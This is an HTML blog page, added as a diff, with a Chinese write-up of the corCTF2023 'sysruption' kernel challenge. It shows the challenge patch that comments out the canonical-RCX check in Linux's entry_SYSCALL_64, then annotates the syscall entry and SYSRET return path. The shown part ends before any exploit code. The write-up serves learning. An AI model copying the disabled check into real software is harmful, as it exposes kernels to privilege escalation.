@@ -1,0 +1,885 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="peiwithhao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="不知道说什么,放一段作者的话:Sysruption was a hardware, micro-architectural, and kernel exploitation challenge Sysruption was a hardware, micro-architectural, and kernel exploitation challenge I wrote for corCTF 20">
+<meta property="og:type" content="article">
+<meta property="og:title" content="corCTF2023-sysruption赛题复现">
+<meta property="og:url" content="https://peiandhao.github.io/2024/05/23/corCTF2023-sysruption/index.html">
+<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
+<meta property="og:description" content="不知道说什么,放一段作者的话:Sysruption was a hardware, micro-architectural, and kernel exploitation challenge Sysruption was a hardware, micro-architectural, and kernel exploitation challenge I wrote for corCTF 20">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://peiandhao.github.io/img/sysryption.png">
+<meta property="article:published_time" content="2024-05-23T12:24:09.000Z">
+<meta property="article:modified_time" content="2024-05-30T13:45:54.200Z">
+<meta property="article:author" content="peiwithhao">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Kernel">
+<meta property="article:tag" content="Syscall">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://peiandhao.github.io/img/sysryption.png">
+  
+  
+  
+  <title>corCTF2023-sysruption赛题复现 - peiwithhao&#39;s Valhalla</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p3ivv1+h@0</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/sysruption.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="corCTF2023-sysruption赛题复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        peiwithhao
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-23 20:24" pubdate>
+          2024年5月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          232 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">corCTF2023-sysruption赛题复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>同样,本题仍然是由will’s root所出的高质量题目,包含知识点系统调用,微架构以及侧信道的知识,从中可以学到大量基础知识</p>
+<h1 id="0x00-题目审查"><a href="#0x00-题目审查" class="headerlink" title="0x00 题目审查"></a>0x00 题目审查</h1><p>我们完全可以相信大师的慷慨程度,题目直接给出题目的patch和<strong>整个kconfig</strong>,Wonderfull!,这样我们就可以在拥有符号表的情况下获得题目一样的环境</p>
+<p>内核版本为6.3.4</p>
+<p>我们可以简单查看一下该patch</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">--- orig_entry_64.S<br>+++ linux<span class="hljs-number">-6.3</span><span class="hljs-number">.4</span>/arch/x86/entry/entry_64.S<br>@@ <span class="hljs-number">-150</span>,<span class="hljs-number">13</span> +<span class="hljs-number">150</span>,<span class="hljs-number">13</span> @@<br> 	ALTERNATIVE <span class="hljs-string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \<br> 		<span class="hljs-string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57<br> <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>-	shl	$(<span class="hljs-number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="hljs-number">1</span>)), %rcx<br>-	sar	$(<span class="hljs-number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="hljs-number">1</span>)), %rcx<br>+	<span class="hljs-meta"># shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><br>+	<span class="hljs-meta"># sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><br> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <br> 	<span class="hljs-comment">/* If this changed %rcx, it was not canonical */</span><br>-	cmpq	%rcx, %r11<br>-	jne	swapgs_restore_regs_and_return_to_usermode<br>+	<span class="hljs-meta"># cmpq	%rcx, %r11</span><br>+	<span class="hljs-meta"># jne	swapgs_restore_regs_and_return_to_usermode</span><br> <br> 	cmpq	$__USER_CS, CS(%rsp)		<span class="hljs-comment">/* CS must match SYSRET */</span><br> 	jne	swapgs_restore_regs_and_return_to_usermode<br></code></pre></td></tr></table></figure>
+
+<p>可以清楚的看见该diff告诉我们该内核版本是将<code>entry_SYSCALL_64</code>这个系统调用入口函数的某一部分进行了注释,那么修改这两项有什么用呢,我们此时需要分析linux内核源码来知晓这一点,接下来我将逐行解析该函数</p>
+<h1 id="0x01-Intel中的sysret"><a href="#0x01-Intel中的sysret" class="headerlink" title="0x01 Intel中的sysret"></a>0x01 Intel中的sysret</h1><p>分析函数之前,我们需要祈祷该函数的开发者对于函数拥有足够的解释来帮助我们快速的了解它,庆幸的是linux内核通常对这点做的很好(至少在我目前分析到的代码中是这样)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 64-bit模式下系统调用指令的入口点. Up to 6 arguments in registers.</span><br><span class="hljs-comment"> * 这是用于 64 位系统调用的唯一入口点/硬件接口设计合理，寄存器</span><br><span class="hljs-comment"> * Linux 使用的参数映射与寄存器非常吻合 </span><br><span class="hljs-comment"> * 使用 SYSCALL 时可用。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * SYSCALL instructions can be found inlined in libc implementations as</span><br><span class="hljs-comment"> * well as some other programs and libraries.  There are also a handful</span><br><span class="hljs-comment"> * of SYSCALL instructions in the vDSO used, for example, as a</span><br><span class="hljs-comment"> * clock_gettimeofday fallback.</span><br><span class="hljs-comment"> * 64-bit模式下的SYSCALL指令即将保存rip到rcx,并清空rflags.RF位,然后将rflags  * 寄存器保存到r11,然后加载新的ss, cs,并且加载来自于预编码的MSRs寄存器的rip</span><br><span class="hljs-comment"> * rflags 被另一个 MSR 的值屏蔽（因此不需要 CLD 和 CLAC）。 SYSCALL 不会在堆 * 栈上保存任何内容，也不会更改 rsp。 </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Registers on entry:</span><br><span class="hljs-comment"> * rax  system call number</span><br><span class="hljs-comment"> * rcx  return address</span><br><span class="hljs-comment"> * r11  saved rflags (note: r11 is callee-clobbered register in C ABI)</span><br><span class="hljs-comment"> * rdi  arg0</span><br><span class="hljs-comment"> * rsi  arg1</span><br><span class="hljs-comment"> * rdx  arg2</span><br><span class="hljs-comment"> * r10  arg3 (needs to be moved to rcx to conform to C ABI)</span><br><span class="hljs-comment"> * r8   arg4</span><br><span class="hljs-comment"> * r9   arg5</span><br><span class="hljs-comment"> * (note: r12-r15, rbp, rbx are callee-preserved in C ABI)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 仅从用户空间调用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When user can change pt_regs-&gt;foo always force IRET. That is because</span><br><span class="hljs-comment"> * it deals with uncanonical addresses better. SYSRET has trouble</span><br><span class="hljs-comment"> * with them due to bugs in both AMD and Intel CPUs.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>
+<p>查看了注释部分我们可以大致了解syscall指令做了什么,然后我们接着看整体系统调用的入口函数执行过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">SYM_CODE_START(entry_SYSCALL_64)<br>	UNWIND_HINT_ENTRY<br>	ENDBR<br><br>	swapgs              <span class="hljs-comment">/* 切换用户的gs_base和内核态的k_gs_base, 这个gs_base在用户态已经弃用,转而使用fs_base寄存器,所以这里仅仅是为了内核而已 */</span><br>	<span class="hljs-comment">/* tss.sp2 仅仅是一个临时存放我们用户栈地址的空间,注意,此时我们并没有修改rsp,所以现在仍然使用的是用户态的栈 */</span><br>	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)<br>	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp<br>	movq	PER_CPU_VAR(pcpu_hot + X86_top_of_stack), %rsp  <span class="hljs-comment">/* 内核栈赋值给rsp */</span><br><br>SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)<br>	ANNOTATE_NOENDBR<br><br>	<span class="hljs-comment">/* 在栈上构造pt_regs 结构体 */</span><br>	pushq	$__USER_DS				<span class="hljs-comment">/* pt_regs-&gt;ss */</span><br>	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="hljs-comment">/* pt_regs-&gt;sp */</span><br>	pushq	%r11					<span class="hljs-comment">/* pt_regs-&gt;flags */</span><br>	pushq	$__USER_CS				<span class="hljs-comment">/* pt_regs-&gt;cs */</span><br>	pushq	%rcx					<span class="hljs-comment">/* pt_regs-&gt;ip */</span><br>SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)<br>	pushq	%rax					<span class="hljs-comment">/* pt_regs-&gt;orig_ax */</span><br><br>	PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br><br>	<span class="hljs-comment">/* IRQs are off. */</span><br>	movq	%rsp, %rdi<br>	<span class="hljs-comment">/* Sign extend the lower 32bit as syscall numbers are treated as int */</span><br>	movslq	%eax, %rsi<br><br>	<span class="hljs-comment">/* clobbers %rax, make sure it is after saving the syscall nr */</span><br>	IBRS_ENTER<br>	UNTRAIN_RET<br><br>	call	do_syscall_64		<span class="hljs-comment">/* returns with IRQs disabled */</span><br><br>...<br></code></pre></td></tr></table></figure>
+
+<p>这里一共办了三件事:</p>
+<ol>
+<li>由硬件自动的加载rip到rcx,rflags到r11当中,其中当然包含了一些段寄存器cs,ss的切换,但是栈指针没换</li>
+<li>由内核实现的入口函数切换rsp为内核栈,然后构造pt_regs结构体用来保存用户态的其它信息,例如普通寄存器,用户段寄存器等等</li>
+<li>调用do_syscall_64来根据rax执行真正的系统调用处理函数</li>
+</ol>
+<p>好了知道这一点之后我们来看对于本题比较重要的后半部分,也就是do_syscall_64之后直到sysret的这一部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 如果我们要返回到完全干净的 64 位用户空间上下文，请尝试使用 SYSRET 而      * 不是 IRET。   如果没有，请走慢速出口路径。       </span><br><span class="hljs-comment">     * 在 Xen PV 的情况下，我们无论如何都必须使用 iret。</span><br><span class="hljs-comment">	 */</span><br><br>	ALTERNATIVE <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \<br>		X86_FEATURE_XENPV<br>movq	<span class="hljs-title function_">RCX</span><span class="hljs-params">(%rsp)</span>, %rcx         <span class="hljs-comment">//获取pt_regs-&gt;rcx</span><br>	movq	<span class="hljs-title function_">RIP</span><span class="hljs-params">(%rsp)</span>, %r11         <span class="hljs-comment">//同上</span><br><br>	cmpq	%rcx, %r11	<span class="hljs-comment">/* SYSRET 需要满足RCX == RIP,至于这里是为什么呢,因为在syscall的时候硬件会将rip保存到rcx当中 */</span><br>	jne	swapgs_restore_regs_and_return_to_usermode<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * 在Intel CPU架构下, SYSRET 这条指令如果执行时伴随着non-canonical RCX/RIP 将会在内核空间导致#GP异常</span><br><span class="hljs-comment">     * 这将使得用户能掌控这个内核,因为用户空间控制着rsp</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span><br><span class="hljs-comment">	 * to be updated to remain correct on both old and new CPUs.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * Change top bits to match most significant bit (47th or 56th bit</span><br><span class="hljs-comment">	 * depending on paging mode) in the address.</span><br><span class="hljs-comment">	 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_5LEVEL</span><br>	ALTERNATIVE &quot;shl $<span class="hljs-params">(<span class="hljs-number">64</span> - <span class="hljs-number">48</span>)</span>, %rcx; sar $(<span class="hljs-number">64</span> - <span class="hljs-number">48</span>), %rcx<span class="hljs-string">&quot;, \</span><br><span class="hljs-string">		&quot;</span>shl $(<span class="hljs-number">64</span> - <span class="hljs-number">57</span>), %rcx; sar $(<span class="hljs-number">64</span> - <span class="hljs-number">57</span>), %rcx<span class="hljs-string">&quot;, X86_FEATURE_LA57</span><br><span class="hljs-string">#else</span><br><span class="hljs-string">	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx                  //判断高16位是否一致</span><br><span class="hljs-string">	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><br><span class="hljs-string">#endif</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/* 如果rcx修改了说明并不是canonical地址 */</span><br><span class="hljs-string">	cmpq	%rcx, %r11</span><br><span class="hljs-string">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-string"></span><br><span class="hljs-string">	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */</span><br><span class="hljs-string">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-string"></span><br><span class="hljs-string">	movq	R11(%rsp), %r11</span><br><span class="hljs-string">	cmpq	%r11, EFLAGS(%rsp)		/* R11 == RFLAGS */</span><br><span class="hljs-string">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/*</span><br><span class="hljs-string">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span><br><span class="hljs-string">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span><br><span class="hljs-string">	 * need to restore it correctly.</span><br><span class="hljs-string">	 *</span><br><span class="hljs-string">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span><br><span class="hljs-string">	 * trap from userspace immediately after SYSRET.  This would cause an</span><br><span class="hljs-string">	 * infinite loop whenever #DB happens with register state that satisfies</span><br><span class="hljs-string">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span><br><span class="hljs-string">	 * this user code:</span><br><span class="hljs-string">	 *</span><br><span class="hljs-string">	 *           movq	$stuck_here, %rcx</span><br><span class="hljs-string">	 *           pushfq</span><br><span class="hljs-string">	 *           popq %r11</span><br><span class="hljs-string">	 *   stuck_here:</span><br><span class="hljs-string">	 *</span><br><span class="hljs-string">	 * would never get past &#x27;stuck_here&#x27;.</span><br><span class="hljs-string">	 */</span><br><span class="hljs-string">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="hljs-string">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/* nothing to check for RSP */</span><br><span class="hljs-string"></span><br><span class="hljs-string">	cmpq	$__USER_DS, SS(%rsp)		/* SS must match SYSRET */</span><br><span class="hljs-string">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/*</span><br><span class="hljs-string">	 * We win! This label is here just for ease of understanding</span><br><span class="hljs-string">	 * perf profiles. Nothing jumps here.</span><br><span class="hljs-string">	 */</span><br><span class="hljs-string">syscall_return_via_sysret:</span><br><span class="hljs-string">	IBRS_EXIT</span><br><span class="hljs-string">	POP_REGS pop_rdi=0      /* 将pt_regs大部分pop出来 */</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/*</span><br><span class="hljs-string">	 * 除了RSP and RDI.所有寄存器都被恢复</span><br><span class="hljs-string">	 * 保存旧的栈指针然后切换到临时栈,这里的临时栈位于虚拟地址cpu_entry_area_mapping,</span><br><span class="hljs-string">	 */</span><br><span class="hljs-string">	movq	%rsp, %rdi</span><br><span class="hljs-string">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp   </span><br><span class="hljs-string">	UNWIND_HINT_EMPTY</span><br><span class="hljs-string"></span><br><span class="hljs-string">	pushq	RSP-RDI(%rdi)	/* RSP */</span><br><span class="hljs-string">	pushq	(%rdi)		/* RDI */</span><br><span class="hljs-string"></span><br><span class="hljs-string">	/*</span><br><span class="hljs-string">	 * We are on the trampoline stack.  All regs except RDI are live.</span><br><span class="hljs-string">	 * We can do future final exit work right here.</span><br><span class="hljs-string">	 */</span><br><span class="hljs-string">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="hljs-string"></span><br><span class="hljs-string">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">	popq	%rdi</span><br><span class="hljs-string">	popq	%rsp        /* 这里恢复了用户态的rsp,也就是说在sysret之前我们已经将rsp恢复了 */</span><br><span class="hljs-string">SYM_INNER_LABEL(entry_SYSRETQ_unsafe_stack, SYM_L_GLOBAL)</span><br><span class="hljs-string">	ANNOTATE_NOENDBR</span><br><span class="hljs-string">	swapgs          /* 交换用户态和内核态的gs_base */</span><br><span class="hljs-string">	sysretq         /* 执行sysret */</span><br></code></pre></td></tr></table></figure>
+
+<p>这里总结为以下几个步骤:</p>
+<ol>
+<li>检查rcx是否是canonical</li>
+<li>恢复用户空间的寄存器,其中包括我们的用户空间RSP</li>
+<li>执行sysret指令</li>
+</ol>
+<p>对于sysret指令做了什么,我们需要查看万能的Intel手册</p>
+<blockquote>
+<p>SYSRET 是SYSCALL的伙伴指令. 它从操作系统系统调用处理程序返回到特权级别 3 的用户代码。它通过从 RCX 加载 RIP 并从 R11加载 RFLAGS 来实现。对于 64 位操作数大小，SYSRET 保持在 64 位模式； 否则，进入兼容模式并且仅加载寄存器的低32位。<br>SYSRET 从IA32_STAR MSR的63:48加载CS和SS选择子 然而CS 和 SS 描述符缓存不是从这些选择器引用的描述符（在 GDT 或 LDT 中）加载的.<br>相反，描述符缓存加载有固定值。 详细信息请参见操作部分。 操作系统软件有责任确保这些选择器值引用的描述符（在 GDT 或 LDT 中）与加载到描述符缓存中的固定值相对应； SYSRET 指令不确保这种对应关系。<br>SYSRET 指令不会修改堆栈指针（ESP 或 RSP）。 因此，软件有必要切换到用户堆栈。 操作系统可能会在执行 SYSRET 之前加载用户堆栈指针（如果在 SYSCALL 之后保存）； 或者，用户代码可以在从 SYSRET 接收控制后加载堆栈指针（如果它在 SYSCALL 之前保存）。<br>下面是Intel手册上给出的关于sysret指令的伪代码</p>
+</blockquote>
